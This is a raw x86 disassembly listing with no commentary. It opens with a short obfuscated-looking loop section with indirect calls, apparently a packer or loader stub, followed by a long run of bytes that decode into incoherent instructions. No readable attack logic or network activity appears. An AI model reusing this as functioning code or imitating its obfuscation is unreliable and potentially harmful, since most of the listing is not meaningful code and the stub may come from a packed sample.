  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
  41158b:	mov    ebx,DWORD PTR [ebp-0x8]
  41158e:	and    DWORD PTR ds:0x42a008,0xb9b
  411598:	xor    edx,eax
  41159a:	jmp    0x4138e3
  41159f:	test   DWORD PTR [edx-0x500c52df],edx
  4115a5:	jno    0x411619
  4115a7:	(bad)  
  4115a8:	cmc    
  4115a9:	jo     0x41159c
  4115ab:	pusha  
  4115ac:	gs sbb eax,0x7caf4047
  4115b2:	jl     0x4115f4
  4115b4:	pop    edi
  4115b5:	jl     0x411633
  4115b7:	sub    eax,0x37e80198
  4115bc:	icebp  
  4115bd:	retf   
  4115be:	dec    edx
  4115bf:	bound  ebp,QWORD PTR [eax*4+0x4a30ed35]
  4115c6:	aaa    
  4115c7:	mov    eax,0xb69459e9
  4115cc:	push   esi
  4115cd:	jo     0x41164a
  4115cf:	xchg   ecx,eax
  4115d0:	test   BYTE PTR [eax],bl
  4115d2:	test   eax,0xa02e46cd
  4115d7:	out    dx,eax
  4115d8:	inc    esp
  4115d9:	xlat   BYTE PTR ds:[ebx]
  4115da:	call   0x219f:0xcdee4a5f
  4115e1:	mov    bh,0xf8
  4115e3:	add    eax,DWORD PTR [ecx]
  4115e5:	(bad)  
  4115e7:	out    dx,al
  4115e8:	icebp  
  4115e9:	xchg   ecx,eax
  4115ea:	retf   
  4115eb:	(bad)  
  4115ec:	pop    ss
  4115ed:	jp     0x411642
  4115ef:	test   DWORD PTR [eax+0x563d6fa3],esp
  4115f5:	in     al,0x68
  4115f7:	push   ebx
  4115f8:	cmp    eax,0xaaef2258
  4115fd:	stos   DWORD PTR es:[edi],eax
  4115fe:	dec    eax
  4115ff:	mov    ch,0x31
  411601:	fmulp  st(1),st
  411603:	loopne 0x4115ba
  411605:	inc    esp
  411606:	popa   
  411607:	dec    edi
  411608:	mov    eax,ds:0xd4bff57a
  41160d:	fmul   QWORD PTR [edx+0x7c]
  411610:	jne    0x411653
  411612:	xor    eax,0xa3aace1c
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	mov    esi,0xc6cf791e
  41161d:	fld    TBYTE PTR [eax-0x10]
  411620:	xabort 0x6f
  411623:	test   eax,0x518a6c8f
  411628:	push   esi
  411629:	mov    edi,0x4d545a31
  41162e:	jnp    0x411601
  411630:	jo     0x411651
  411632:	dec    ebx
  411633:	pop    ss
  411634:	popf   
  411635:	jmp    0xa095:0xf2f7d099
  41163c:	int    0xf2
  41163e:	cmp    eax,0xd53f99b0
  411643:	aam    0x96
  411645:	icebp  
  411646:	push   0x2edb0783
  41164b:	pop    eax
  41164c:	ss jl  0x411659
  41164f:	sbb    al,0xcb
  411651:	lds    edi,FWORD PTR [ebx+0x19]
  411654:	adc    eax,0xf11cead1
  411659:	aas    
  41165a:	call   0x9433:0x1a88177b
  411661:	push   ecx
  411662:	pop    edx
  411663:	(bad)  
  411664:	(bad)  
  411665:	sar    dl,1
  411667:	pop    ebp
  411668:	mov    eax,0xb0c7f65e
  41166d:	mov    DWORD PTR [ecx],edi
  41166f:	mov    cl,0x8f
  411671:	cwde   
  411672:	jecxz  0x41161d
  411674:	retf   0xd68c
  411677:	test   al,0x24
  411679:	lods   al,BYTE PTR ds:[esi]
  41167a:	sbb    dl,bh
  41167c:	ret    0xb6a0
  41167f:	sbb    eax,0x942a02f4
  411684:	jnp    0x411637
  411686:	jbe    0x4116d8
  411688:	lods   al,BYTE PTR ds:[esi]
  411689:	inc    eax
  41168a:	push   esp
  41168b:	mov    ah,0x29
  41168d:	sbb    al,cl
  41168f:	inc    esi
  411690:	int3   
  411691:	shr    DWORD PTR [edx],cl
  411693:	je     0x411632
  411695:	(bad)  
  411696:	jb     0x411670
  411698:	push   esi
  411699:	push   0xffffffbf
  41169b:	adc    BYTE PTR [ecx],al
  41169d:	mov    eax,0x3252363b
  4116a2:	test   DWORD PTR [eax-0x2a52786d],0x3ee458b2
  4116ac:	repz mov ebx,DWORD PTR [ecx]
  4116af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116b0:	or     ebx,esp
  4116b2:	add    BYTE PTR [edi],ah
  4116b4:	shl    DWORD PTR [edx+0x3],1
  4116b7:	and    eax,0x4a5abd2f
  4116bc:	test   BYTE PTR [esi],0xa7
  4116bf:	adc    eax,0xcb83061c
  4116c4:	lds    esp,FWORD PTR [ebx]
  4116c6:	popa   
  4116c7:	cmp    al,0x59
  4116c9:	outs   dx,DWORD PTR ds:[esi]
  4116ca:	out    dx,eax
  4116cb:	jl     0x411677
  4116cd:	jo     0x4116d2
  4116cf:	pop    esp
  4116d0:	je     0x411655
  4116d2:	mov    ds:0x6bd4fe61,eax
  4116d7:	ja     0x41166f
  4116d9:	pop    ds
  4116da:	dec    eax
  4116db:	jmp    0xbe2c:0x9a3abfa0
  4116e2:	lock cmp esi,DWORD PTR [ecx+edi*8-0x1fd7772b]
  4116ea:	jns    0x41170e
  4116ec:	jb     0x41169c
  4116ee:	shl    DWORD PTR [ecx+ebx*1],cl
  4116f1:	(bad)  
  4116f2:	icebp  
  4116f3:	test   DWORD PTR [ecx],esi
  4116f5:	aad    0x57
  4116f7:	ret    0x459b
  4116fa:	rcr    cl,0x2f
  4116fd:	addr16 ja 0x41168a
  411700:	add    al,0xda
  411702:	sbb    al,0x0
  411704:	call   0x478a919e
  411709:	jae    0x411714
  41170b:	or     eax,0x1af1178
  411710:	dec    edx
  411711:	mov    WORD PTR [edi-0x280d42ee],ds
  411717:	pop    esi
  411718:	neg    DWORD PTR [ebx-0x8]
  41171b:	aad    0xd1
  41171d:	cdq    
  41171e:	add    eax,0xbce7f374
  411723:	ss xor al,0xa2
  411726:	jmp    0x4116d0
  411728:	jmp    0xef6:0xeeaa4878
  41172f:	out    dx,al
  411730:	test   cl,bl
  411732:	pop    edi
  411733:	scas   eax,DWORD PTR es:[edi]
  411734:	pushf  
  411735:	push   ebx
  411736:	sbb    DWORD PTR [ecx+edi*2+0xbaa8cbf],ebx
  41173d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41173e:	xchg   ebx,eax
  41173f:	mov    eax,ds:0x545c623c
  411744:	cmp    DWORD PTR [ebx+ebp*2],ecx
  411747:	repnz push cs
  411749:	imul   eax,ebp,0x60d435ec
  41174f:	dec    eax
  411750:	sbb    dh,BYTE PTR [edi+0x7a]
  411753:	loopne 0x411746
  411755:	aam    0xb2
  411757:	pop    ebx
  411758:	xchg   DWORD PTR [edx+0x3c],edx
  41175b:	call   0x117e:0x12a3de6f
  411762:	stos   DWORD PTR es:[edi],eax
  411763:	xchg   esi,eax
  411764:	mov    ch,BYTE PTR [eax+0x5c]
  411767:	dec    ecx
  411768:	pusha  
  411769:	call   0x987d74a8
  41176e:	fadd   st,st(1)
  411770:	cmc    
  411771:	int3   
  411772:	pop    eax
  411773:	or     ebx,esi
  411775:	mov    edx,0xb228fada
  41177a:	push   DWORD PTR ss:[ebp+eiz*2+0x9e53922]
  411782:	push   cs
  411783:	jecxz  0x4117d4
  411785:	push   ecx
  411786:	nop
  411787:	push   edi
  411788:	or     ch,BYTE PTR [eax-0x3607b1ac]
  41178e:	test   BYTE PTR ds:0xbe45b7b4,dl
  411794:	push   0x11
  411796:	call   0xc79bc215
  41179b:	cmc    
  41179c:	dec    esi
  41179d:	retf   0xab9a
  4117a0:	push   es
  4117a1:	push   eax
  4117a2:	adc    ebp,esp
  4117a4:	inc    ebp
  4117a5:	fs inc eax
  4117a7:	mov    DWORD PTR [ebx-0x253296f1],esp
  4117ad:	cmp    DWORD PTR [edi+0x2a],ecx
  4117b0:	retf   0x75ce
  4117b3:	or     eax,0x4b4e6e38
  4117b8:	mov    al,ds:0xd93ce0d9
  4117bd:	xor    bl,BYTE PTR ds:0x2597a53
  4117c3:	fcomip st,st(7)
  4117c5:	cli    
  4117c6:	xchg   ecx,eax
  4117c7:	jo     0x411783
  4117c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ca:	mov    ecx,0x288d1d68
  4117cf:	dec    DWORD PTR [eax-0x7a792728]
  4117d5:	out    0xf4,al
  4117d7:	mov    ah,0xf9
  4117d9:	fld    st(1)
  4117db:	aaa    
  4117dc:	sub    eax,0xed4c285
  4117e1:	sar    BYTE PTR ds:0x11600baf,1
  4117e7:	das    
  4117e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e9:	clc    
  4117ea:	scas   eax,DWORD PTR es:[edi]
  4117eb:	daa    
  4117ec:	pop    es
  4117ed:	dec    ecx
  4117ee:	or     esp,DWORD PTR [eax]
  4117f0:	rcr    DWORD PTR [edx],1
  4117f2:	pop    edi
  4117f3:	or     ecx,ebp
  4117f5:	push   esp
  4117f6:	xchg   esi,eax
  4117f7:	xor    DWORD PTR [edi],ebp
  4117f9:	int    0x48
  4117fb:	loopne 0x4117b7
  4117fd:	mov    bl,cl
  4117ff:	sub    eax,0x7368218c
  411804:	ja     0x411791
  411806:	(bad)  
  411807:	mov    eax,0x30aabae7
  41180c:	mov    ebx,0xfc3540bf
  411811:	add    BYTE PTR [eax],0x80
  411814:	mov    bh,BYTE PTR [ebx+0x30]
  411817:	arpl   bp,bp
  411819:	lods   al,BYTE PTR ds:[esi]
  41181a:	pop    ss
  41181b:	lods   eax,DWORD PTR ds:[esi]
  41181c:	sub    al,0x34
  41181e:	mov    bl,0x6b
  411820:	repz fnstcw WORD PTR ds:0x88202bd0
  411827:	jp     0x4117dd
  411829:	jge    0x4117de
  41182b:	dec    eax
  41182c:	mov    ebp,0x7879c9cf
  411831:	mov    dl,0x8b
  411833:	sub    BYTE PTR [eax],bl
  411835:	inc    ebp
  411836:	cdq    
  411837:	js     0x411844
  411839:	enter  0x1638,0x7
  41183d:	retf   
  41183e:	test   al,0xc9
  411840:	(bad)  
  411841:	gs jmp 0xf6d80f19
  411847:	jmp    0xdf5841d8
  41184c:	add    ch,BYTE PTR [esi]
  41184e:	add    al,0x28
  411850:	test   eax,0x356e39e4
  411855:	nop
  411856:	out    dx,eax
  411857:	mov    ebx,esi
  411859:	int    0x99
  41185b:	mov    esp,0x85df3e96
  411860:	ja     0x41188b
  411862:	mov    bh,0xbd
  411864:	and    DWORD PTR [ebx+eax*1-0x2b],esi
  411868:	mov    fs,WORD PTR [ebx]
  41186a:	sbb    cl,cl
  41186c:	push   esp
  41186d:	cmp    esi,DWORD PTR [esi]
  41186f:	cwde   
  411870:	pop    ss
  411871:	push   ebp
  411872:	fisub  WORD PTR [edx+0x7c]
  411875:	lds    ecx,FWORD PTR [edi+0x4c]
  411878:	bound  ecx,QWORD PTR [ecx-0x15]
  41187b:	or     BYTE PTR [ebx+0x345d10e7],cl
  411881:	in     al,0x1
  411883:	cmp    edx,esi
  411885:	popf   
  411886:	adc    ebp,ecx
  411888:	mov    dh,ch
  41188a:	add    DWORD PTR [esi],ecx
  41188c:	push   ecx
  41188d:	or     BYTE PTR [eax],bh
  41188f:	lods   eax,DWORD PTR ds:[esi]
  411890:	pop    esp
  411891:	xchg   ebx,eax
  411892:	shl    BYTE PTR gs:[edx-0x20],1
  411896:	mov    bh,0xdd
  411898:	xor    ecx,DWORD PTR [ebx-0x6e10f16c]
  41189e:	xchg   DWORD PTR [edi+0x92fbcfb],esi
  4118a4:	out    0x3d,al
  4118a6:	push   0xf8c557d5
  4118ab:	inc    eax
  4118ac:	mov    BYTE PTR [ecx+0x5],ch
  4118af:	cs and al,cl
  4118b2:	pusha  
  4118b3:	add    eax,0x17a41064
  4118b8:	loop   0x4118e0
  4118ba:	fstp   QWORD PTR [ebx+ecx*4-0x473b174c]
  4118c1:	jmp    0x411930
  4118c3:	mov    esi,DWORD PTR [edi+0x26]
  4118c6:	xor    dl,ah
  4118c8:	push   esp
  4118c9:	jg     0x4118e7
  4118cb:	adc    eax,DWORD PTR [ebx]
  4118cd:	test   al,0x18
  4118cf:	sar    DWORD PTR [ecx-0x7287f94b],1
  4118d5:	lods   al,BYTE PTR ds:[esi]
  4118d6:	les    ecx,FWORD PTR [ecx]
  4118d8:	pop    ds
  4118d9:	mov    esi,DWORD PTR [ebp-0x6b]
  4118dc:	mov    esi,0x541c73db
  4118e1:	out    dx,eax
  4118e2:	xchg   esp,eax
  4118e3:	ret    0x8016
  4118e6:	cmp    DWORD PTR [edi+edi*8],0x58
  4118ea:	cdq    
  4118eb:	jl     0x411943
  4118ed:	mov    ebx,0x3d3be37c
  4118f2:	or     ecx,DWORD PTR [esi]
  4118f4:	xchg   ecx,eax
  4118f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118f6:	sbb    BYTE PTR [edx+0x86e01],0x5c
  4118fd:	mov    DWORD PTR [ecx+0x10],ecx
  411900:	cld    
  411901:	and    dl,BYTE PTR [ebx+0x75cc31fd]
  411907:	mov    bl,0xdd
  411909:	out    dx,eax
  41190a:	stos   BYTE PTR es:[edi],al
  41190b:	cwde   
  41190c:	push   ss
  41190d:	pop    edi
  41190e:	enter  0x2ea0,0x53
  411912:	fs ds arpl ax,sp
  411916:	add    dh,BYTE PTR [ebx+esi*1+0x586c20ca]
  41191d:	mov    dl,0xf
  41191f:	add    al,0x8f
  411921:	(bad)  
  411922:	in     al,dx
  411923:	stos   DWORD PTR es:[edi],eax
  411924:	mov    edi,0x6a04a14f
  411929:	ret    0x5ccd
  41192c:	dec    edi
  41192d:	pop    ebp
  41192e:	mov    edx,0xbf1b3213
  411933:	inc    esi
  411934:	and    ebp,DWORD PTR [ebx]
  411936:	loope  0x41193b
  411938:	into   
  411939:	add    BYTE PTR [ebp+0x79],0xc5
  41193d:	sub    al,0xde
  41193f:	adc    eax,0xe729fa1b
  411944:	bound  ecx,QWORD PTR [esi]
  411946:	fistp  DWORD PTR ds:0x6c6117bf
  41194c:	mov    ebp,DWORD PTR [ecx-0x57]
  41194f:	mov    WORD PTR [eax+esi*8-0x6e],?
  411953:	push   ebp
  411954:	xlat   BYTE PTR ds:[ebx]
  411955:	push   edi
  411956:	dec    edx
  411957:	aam    0x12
  411959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41195a:	xor    DWORD PTR [edx-0x98fc9e2],0xb69aa826
  411964:	pop    ebx
  411965:	xchg   esp,eax
  411966:	push   ebp
  411967:	push   es
  411968:	fwait
  411969:	xor    BYTE PTR [ecx+0x4f],dh
  41196c:	shl    BYTE PTR [edx],1
  41196e:	lock in eax,dx
  411970:	(bad)  
  411971:	stc    
  411972:	jmp    0xfd08:0x74d61ccb
  411979:	test   al,0x96
  41197b:	imul   ecx,DWORD PTR [edi-0x1b],0xffffffa9
  41197f:	std    
  411980:	outs   dx,DWORD PTR ds:[esi]
  411981:	jp     0xb08980b4
  411987:	(bad)  
  411988:	(bad)  
  411989:	scas   eax,DWORD PTR es:[edi]
  41198a:	mov    dh,0x13
  41198c:	push   esp
  41198d:	mov    ecx,0x30cc4852
  411992:	ja     0x41199c
  411994:	sub    edi,edi
  411996:	or     eax,0xffffffef
  411999:	cmp    DWORD PTR [eax+0x6c],0x9ceec1e9
  4119a0:	cs cld 
  4119a2:	sub    DWORD PTR [eax],esi
  4119a4:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4119a6:	out    0x22,eax
  4119a8:	test   BYTE PTR [ebx+0x65],bh
  4119ab:	push   edi
  4119ac:	and    BYTE PTR [ebx-0x3be88e46],cl
  4119b2:	outs   dx,DWORD PTR ds:[esi]
  4119b3:	sub    BYTE PTR [esi],dl
  4119b5:	call   0xaec281a7
  4119ba:	ror    DWORD PTR [ebx+0x57c69dec],0x1a
  4119c1:	or     eax,0xa6bb655e
  4119c6:	outs   dx,BYTE PTR ds:[esi]
  4119c7:	adc    eax,0x98bdb2d1
  4119cc:	sbb    BYTE PTR [esi+0x251c5aae],al
  4119d2:	call   0xc589:0xd636b761
  4119d9:	mov    esi,0x3e806995
  4119de:	or     al,0x92
  4119e0:	fcmovnbe st,st(7)
  4119e2:	jmp    0xa75e:0x29830bf7
  4119e9:	jecxz  0x411a3b
  4119eb:	push   ebp
  4119ec:	push   esp
  4119ed:	push   cs
  4119ee:	std    
  4119ef:	(bad)  
  4119f0:	cs cwde 
  4119f2:	outs   dx,DWORD PTR ds:[esi]
  4119f3:	sti    
  4119f4:	mov    cl,0x65
  4119f6:	retf   0xc68f
  4119f9:	mov    al,ds:0x6243a58
  4119fe:	fwait
  4119ff:	popf   
  411a00:	aam    0x22
  411a02:	and    eax,DWORD PTR [esi-0x4f6806e]
  411a08:	jecxz  0x41198f
  411a0a:	int3   
  411a0b:	lods   al,BYTE PTR ds:[esi]
  411a0c:	stc    
  411a0d:	frstor [edx+0x6b510af]
  411a13:	mov    eax,DWORD PTR [edi-0x24]
  411a16:	cld    
  411a17:	adc    al,0xe8
  411a19:	add    al,0xf3
  411a1b:	scas   al,BYTE PTR es:[edi]
  411a1c:	mov    ebp,0x8c7c1aba
  411a21:	push   edx
  411a22:	add    esp,DWORD PTR fs:[ebp-0x28ee4b79]
  411a29:	ins    BYTE PTR es:[edi],dx
  411a2a:	outs   dx,DWORD PTR ds:[esi]
  411a2b:	or     al,cl
  411a2d:	adc    eax,0xb6badb98
  411a32:	and    cl,dl
  411a34:	push   es
  411a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a36:	or     al,cl
  411a38:	ins    DWORD PTR es:[edi],dx
  411a39:	inc    esp
  411a3a:	into   
  411a3b:	sbb    DWORD PTR [ebx-0x6c],ebp
  411a3e:	adc    al,0xb7
  411a40:	sbb    bl,BYTE PTR [esi]
  411a42:	add    ebx,DWORD PTR ds:0xea802e8d
  411a48:	fdivr  QWORD PTR [esi+0x442792db]
  411a4e:	or     BYTE PTR [eax-0x3069eef9],cl
  411a54:	sbb    eax,DWORD PTR [ebx]
  411a56:	cmc    
  411a57:	jge    0x4119ec
  411a59:	call   0xd7bdf764
  411a5e:	les    esi,FWORD PTR [esi]
  411a60:	pusha  
  411a61:	(bad)
  411a66:	iret   
  411a67:	mov    ds:0x6d05699f,eax
  411a6c:	or     al,0x77
  411a6e:	or     al,0xd7
  411a70:	push   ds
  411a71:	jle    0x411a8e
  411a73:	mov    gs,WORD PTR [edi-0x6eae97a5]
  411a79:	xchg   ebp,eax
  411a7a:	adc    BYTE PTR [edx+0x5b9133c1],bh
  411a80:	cmp    eax,DWORD PTR [edx+ebp*8+0x4]
  411a84:	push   0x7a0e9981
  411a89:	ret    0xefa6
  411a8c:	js     0x411aa5
  411a8e:	pop    ebp
  411a8f:	jne    0x411abf
  411a91:	or     ecx,edx
  411a93:	daa    
  411a94:	mov    DWORD PTR [esi+0x173f65dd],edi
  411a9a:	das    
  411a9b:	into   
  411a9c:	(bad)  
  411a9d:	xchg   BYTE PTR [eax+0x3ae209bc],ah
  411aa3:	mov    eax,0xdcfa0331
  411aa8:	lock pop ds
  411aaa:	cdq    
  411aab:	xchg   ebp,eax
  411aac:	in     eax,dx
  411aad:	fild   DWORD PTR [edx-0x15668dd8]
  411ab3:	sbb    BYTE PTR [ecx-0x7c],ch
  411ab6:	in     al,dx
  411ab7:	dec    eax
  411ab8:	arpl   WORD PTR [eax-0x10],sp
  411abb:	add    al,0xf8
  411abd:	lds    eax,FWORD PTR [esi]
  411abf:	and    eax,0xd3566de
  411ac4:	mov    eax,ds:0x7b2937bd
  411ac9:	(bad)  [edi+0x5b]
  411acc:	sbb    BYTE PTR [edx-0x771fd7fd],al
  411ad2:	xor    ecx,DWORD PTR [edi]
  411ad4:	dec    esp
  411ad5:	mov    cl,BYTE PTR [ecx-0x1d]
  411ad8:	mov    esp,0x8a097f80
  411add:	jp     0x411b5a
  411adf:	ins    BYTE PTR es:[edi],dx
  411ae0:	pusha  
  411ae1:	or     ah,BYTE PTR [esi+0x33b56aae]
  411ae7:	hlt    
  411ae8:	adc    BYTE PTR [esi+0x3a],al
  411aeb:	cmp    ebx,DWORD PTR [esi]
  411aed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aee:	ffree  st(2)
  411af0:	inc    edi
  411af1:	xor    eax,0xbb333a77
  411af6:	jecxz  0x411abd
  411af8:	mov    ds:0x46b70e03,eax
  411afd:	jno    0x411a81
  411aff:	cmovo  ebp,DWORD PTR [edx+0x59d80ee6]
  411b06:	xor    DWORD PTR [eax],edi
  411b08:	(bad)  [edx]
  411b0a:	es jge 0x411b26
  411b0d:	ds or  dl,0x1e
  411b11:	or     eax,DWORD PTR [ecx+ebx*1+0x842ca61]
  411b18:	mov    ds:0x4bd0c1ab,al
  411b1d:	push   0xb
  411b1f:	(bad)  
  411b20:	fisub  WORD PTR [ebp-0xff3c96]
  411b26:	xchg   DWORD PTR [eax-0x30fbe14a],eax
  411b2c:	sbb    esi,DWORD PTR [ebp+0x14af8a76]
  411b32:	sbb    BYTE PTR [edx+0x40],bh
  411b35:	(bad)  
  411b36:	clc    
  411b37:	(bad)  
  411b38:	or     ch,BYTE PTR [esi]
  411b3a:	xchg   edx,eax
  411b3b:	adc    DWORD PTR [ecx],esi
  411b3d:	xor    ebx,0x65a593af
  411b43:	fsubr  st,st(5)
  411b45:	mov    eax,0x27160a1c
  411b4a:	out    dx,eax
  411b4b:	scas   eax,DWORD PTR es:[edi]
  411b4c:	xor    ecx,DWORD PTR [ecx+edx*2+0x31]
  411b50:	xchg   ebx,eax
  411b51:	sbb    ch,bh
  411b53:	xor    al,ah
  411b55:	nop
  411b56:	push   edx
  411b57:	pop    eax
  411b58:	sbb    esi,ebx
  411b5a:	mov    ah,0x51
  411b5c:	call   0x79ae:0x236d3f8a
  411b63:	mov    ebp,0xc639d837
  411b68:	sbb    BYTE PTR [eax+ebp*1-0x6e34b7de],bl
  411b6f:	fisub  WORD PTR [edx+ecx*1-0x707d1a2c]
  411b76:	mov    ah,0xed
  411b78:	add    ebp,edx
  411b7a:	ins    DWORD PTR es:[edi],dx
  411b7b:	retf   0x2a08
  411b7e:	pop    ebx
  411b7f:	add    al,0x21
  411b81:	inc    ebx
  411b82:	jns    0x411b40
  411b84:	lds    ecx,FWORD PTR [ebp+0x4bf7adf1]
  411b8a:	jmp    0x8593:0x985e290e
  411b91:	xor    bh,cl
  411b93:	sbb    al,0xbb
  411b95:	(bad)  
  411b96:	sahf   
  411b97:	add    ecx,ebx
  411b99:	sub    ch,al
  411b9b:	ret    
  411b9c:	loop   0x411b4f
  411b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b9f:	maskmovq mm2,(bad)
  411ba0:	not    DWORD PTR [edi]
  411ba2:	fadd   QWORD PTR ds:0xd7388e18
  411ba8:	into   
  411ba9:	mov    ebp,0xcd49104
  411bae:	ret    
  411baf:	int    0x4e
  411bb1:	cs imul esi,eax,0x42
  411bb5:	jge    0x411c25
  411bb7:	push   es
  411bb8:	mov    ah,BYTE PTR [edi+0x8db3666]
  411bbe:	inc    esi
  411bbf:	lea    ebx,[edi-0x720a3058]
  411bc5:	xchg   DWORD PTR [ecx-0x64],ebx
  411bc8:	je     0x411c23
  411bca:	(bad)  
  411bcb:	mov    ebx,0xe1673ead
  411bd0:	or     edi,esp
  411bd2:	sub    DWORD PTR [edx+0x6c22dab3],ecx
  411bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bd9:	adc    ebx,eax
  411bdb:	mov    cl,BYTE PTR [eax-0x1a]
  411bde:	sti    
  411bdf:	in     al,0x33
  411be1:	push   edx
  411be2:	ja     0x411b8d
  411be4:	and    DWORD PTR [esi+0x40c424fd],ecx
  411bea:	ins    BYTE PTR es:[edi],dx
  411beb:	push   ebp
  411bec:	dec    eax
  411bed:	cdq    
  411bee:	adc    eax,0xd55bf81c
  411bf3:	inc    esp
  411bf4:	xchg   edx,eax
  411bf5:	pop    ecx
  411bf6:	scas   eax,DWORD PTR es:[edi]
  411bf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf8:	xor    cl,BYTE PTR [ecx+0x67]
  411bfb:	jmp    0x3435:0x93bd2e15
  411c02:	test   DWORD PTR [edx-0x4d045b0a],ecx
  411c08:	pop    ss
  411c09:	mov    DWORD PTR [edi],esp
  411c0b:	pusha  
  411c0c:	fcompp 
  411c0e:	push   ss
  411c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c10:	icebp  
  411c11:	dec    eax
  411c12:	cli    
  411c13:	or     edi,DWORD PTR [ebp-0x1206baf2]
  411c19:	pop    ebp
  411c1a:	call   0xce7d2f17
  411c1f:	(bad)  
  411c20:	shr    edi,1
  411c22:	aas    
  411c23:	jg     0x411c0a
  411c25:	jl     0x411c3b
  411c27:	daa    
  411c28:	aas    
  411c29:	mov    ds:0x8ecb8b01,eax
  411c2e:	pop    edx
  411c2f:	inc    eax
  411c30:	and    eax,0x1da2613c
  411c35:	fistp  DWORD PTR [ebp+0x54747ee6]
  411c3b:	in     eax,dx
  411c3c:	cmp    al,0x95
  411c3e:	push   esp
  411c3f:	and    al,BYTE PTR [eax+0x3c793035]
  411c45:	rol    ch,0x12
  411c48:	into   
  411c49:	sub    al,0x88
  411c4b:	jo     0x411c79
  411c4d:	push   0x10726ab4
  411c52:	pop    ecx
  411c53:	and    ecx,DWORD PTR [eax+0x76b11085]
  411c59:	jo     0x411c88
  411c5b:	dec    eax
  411c5c:	sti    
  411c5d:	scas   al,BYTE PTR es:[edi]
  411c5e:	pusha  
  411c5f:	mov    eax,ds:0x79313f73
  411c64:	aas    
  411c65:	popa   
  411c66:	fdiv   DWORD PTR [edx+0x33]
  411c69:	jmp    0x359f:0x6b67fd68
  411c70:	dec    edx
  411c71:	std    
  411c72:	push   cs
  411c73:	mov    eax,0xe5408908
  411c78:	iret   
  411c79:	mov    al,ds:0xa47654e1
  411c7e:	sub    BYTE PTR [edi],0xe5
  411c81:	jbe    0x411c8c
  411c83:	into   
  411c84:	sbb    al,0x16
  411c86:	pop    ebp
  411c87:	xchg   BYTE PTR [ecx],ah
  411c89:	mov    ah,0x6e
  411c8b:	mov    eax,0xf5fdd776
  411c90:	ins    BYTE PTR es:[edi],dx
  411c91:	dec    edi
  411c92:	and    ah,cl
  411c94:	sbb    eax,DWORD PTR [edx]
  411c96:	xchg   ecx,eax
  411c97:	test   DWORD PTR [edx],edi
  411c99:	jmp    0x23361e84
  411c9e:	(bad)  
  411c9f:	xchg   BYTE PTR gs:[edx-0xc],bh
  411ca3:	inc    esi
  411ca4:	iret   
  411ca5:	scas   eax,DWORD PTR es:[edi]
  411ca6:	jns    0x411c4d
  411ca8:	mov    edx,0x6e8be4ae
  411cad:	and    cl,BYTE PTR [eax+0x20]
  411cb0:	icebp  
  411cb1:	jne    0x411d2f
  411cb3:	ins    BYTE PTR es:[edi],dx
  411cb4:	sbb    eax,esi
